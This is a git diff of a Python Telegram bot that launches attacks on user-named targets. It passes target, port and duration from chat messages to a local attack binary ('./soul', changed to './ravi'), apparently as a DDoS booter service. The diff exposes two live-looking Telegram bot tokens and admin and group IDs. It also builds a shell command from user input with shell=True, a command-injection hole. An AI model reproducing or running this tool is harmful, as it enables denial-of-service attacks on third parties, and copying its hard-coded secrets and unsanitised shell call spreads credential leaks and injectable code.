@@ -5,12 +5,12 @@ import subprocess
 import threading
 
 # ✅ TELEGRAM BOT TOKEN
-bot = telebot.TeleBot('8111473127:AAGHKRUisQdbZqYpmdUIN_eemwclYLfOYhM')
+bot = telebot.TeleBot('8111473127:AAGdUoAxw0bvdwtWezRjQ7hMVvKQYT_RO3k')
 
 # ✅ GROUP & CHANNEL SETTINGS
 GROUP_ID = "-1002369239894"
 SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
-ADMINS = [7129010361]
+ADMINS = ["7129010361"]
 
 # ✅ GLOBAL VARIABLES
 active_attacks = {}  # अटैक स्टेटस ट्रैक करेगा
@@ -99,7 +99,7 @@ def handle_attack(message):
     # ✅ Attack Execution Function
     def attack_execution():
         try:
-            subprocess.run(f"./soul {target} {port} {time_duration} 2500", shell=True, check=True, timeout=time_duration)
+            subprocess.run(f"./ravi {target} {port} {time_duration} 1200", shell=True, check=True, timeout=time_duration)
         except subprocess.CalledProcessError:
             bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
         finally:
